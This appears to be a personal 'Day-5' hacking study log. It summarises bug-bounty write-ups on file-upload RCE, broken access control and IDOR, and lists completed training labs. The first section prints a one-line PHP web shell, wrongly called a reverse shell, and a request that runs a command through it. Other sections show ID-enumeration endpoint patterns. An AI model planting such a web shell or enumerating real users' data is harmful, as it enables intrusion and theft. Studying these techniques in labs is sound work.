# Day-5 (30-Days-Of-Hacking)

### 1. Read 3 Article: [DONE]

- https://medium.com/@haroonhameed_76621/achieving-remote-code-execution-via-unrestricted-file-upload-6050f360c218
- https://mearegtu.medium.com/broken-access-control-cc6cfd793b15
- https://mearegtu.medium.com/insecure-direct-object-reference-exposes-all-users-of-microsoft-azure-independent-software-vendors-bed3b45e509

#### Learned:

1. From Article 1:
      - Reverse Shell : `(<?php$cmd = $_GET['cmd'];echo `$cmd`;?>)`
      - Found script.js in JavaScript File, Fuzzing is Important, Fuzz everywhere.
      - `POST /uploadform/uploads/shell.php?code=echo%20%60id%60 HTTP/2`
      - And We got our RCE via File Upload.

2. From Article 2:
    - Broken Access Control, VUlnerable Endpoint : `(/api/Users/email?emailId=maotg@???.onmicrosoft.com)`
    - Able to extract other details using Endpoint: `(/api/Users/email?emailId=moxxx@???.onmicrosoft.com)`
    - This Endpoint Contains All user DATA ~ 112 MB Endpoint: `(/api/Users)` Which equals to 100,000 users Data, this is HUGE.

3. From Article 3:
    - IDOR Vulnerability, Vulnerable Sellerid Endpoint `(GET /en-us/dashboard/account/<reduct>/<reduct>/<reduct>/<reduct>/76????10/users HTTP/2)`
    - Close analysis reveals ‘sellerId’ parameter value seems sequential in nature.
    - Able to extract other details using `(GET /en-us/dashboard/account/<reduct>/<reduct>/<reduct>/<reduct>/76????20/users HTTP/2)`
    - **Python Script To Automate Everything :**![](https://miro.medium.com/max/1400/1*wSqF6_RolTJjql3AiuDupg.png)

### 2. TryHackMe Labs: [DONE]

 - [X] Solved Complete Room Of **Hydra && Sublist3r** : https://tryhackme.com/room/hydra , https://tryhackme.com/room/rpsublist3r
  
### 3. PortSwigger Labs: [DONE]

 - [X] **Access control vulnerabilities (7/13)**
 -  Lab: User ID controlled by request parameter  (https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter)
 -  Lab: User ID controlled by request parameter with data leakage in redirect  (https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect)
 -  Lab: User ID controlled by request parameter with password disclosure (https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure)
 -  Lab: Insecure direct object references (https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references)
  
### 4. Youtube Video: [HALF DONE]

 - Watched : BittenTech HTTP Security Headers | Content Security Policy (CSP) | Strict Transport Security (HSTS) : (https://www.youtube.com/watch?v=8_nfQAdWELU&t=1148s)
